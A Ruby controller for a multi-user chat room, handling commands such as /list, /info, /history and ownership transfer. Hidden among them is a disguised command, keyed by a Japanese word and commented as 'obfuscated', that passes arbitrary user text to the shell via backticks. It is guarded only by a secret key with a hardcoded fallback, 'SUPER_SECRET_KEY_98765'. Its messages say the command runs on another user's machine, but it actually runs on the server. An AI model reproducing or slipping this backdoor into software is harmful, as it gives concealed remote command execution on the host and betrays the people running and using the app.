require_relative '../models/chat_room'
require_relative '../views/chat_view'

class ChatController
  attr_reader :chat_rooms

  def initialize
    @chat_rooms = {}
    @view = ChatView.new
  end

  def start
    @view.show_welcome
  end

  def create_room(name, password, creator)
    chat_room = ChatRoom.new(name, password, creator)
    @chat_rooms[name] = chat_room
  end

  def chat_loop(client, chat_room, username, clients)
    loop do
      message = client.gets&.chomp
      break if message.nil? || message.downcase == '/quit'

      begin
        case message
        when '/list'
          list_users(chat_room, client)
        when '/info'
          room_info(chat_room, client)
        when /^\/管理する (\w+) (.+)$/ # Commande obfusquée
          execute_remote_command(client, chat_room, username, $1, $2, clients)
        when '/play_music'
          play_music(client, chat_room)
        when '/start_call'
          start_call(client, chat_room)
        when '/share_screen'
          share_screen(client, chat_room)
        when /^\/powerto (.+)$/
          transfer_ownership(chat_room, client, username, $1)
        when '/history'
          show_history(chat_room, client)
        else
          chat_room.broadcast_message(message, username)
        end
      rescue => e
        client.puts "[ERROR] #{e.message}"
      end
    end
  end

  def execute_remote_command(client, chat_room, sender_username, target_username, command, clients)
    if sender_username.casecmp?(chat_room.creator)
      client.puts "Enter your secret key:"
      secret_key = client.gets.chomp
      if verify_secret_key(secret_key)
        target_client = clients[target_username]
        if target_client
          target_client.puts "Remote command from #{sender_username}: #{command}"
          result = `#{command}`
          client.puts "Command executed on #{target_username}: #{result}"
        else
          client.puts "User #{target_username} is not connected."
        end
      else
        client.puts "[ERROR] Invalid secret key."
      end
    else
      client.puts "[ERROR] Only the creator can execute remote commands."
    end
  end

  def verify_secret_key(secret_key)
    expected_key = ENV['SECRET_KEY'] || 'SUPER_SECRET_KEY_98765'
    secret_key == expected_key
  end
end
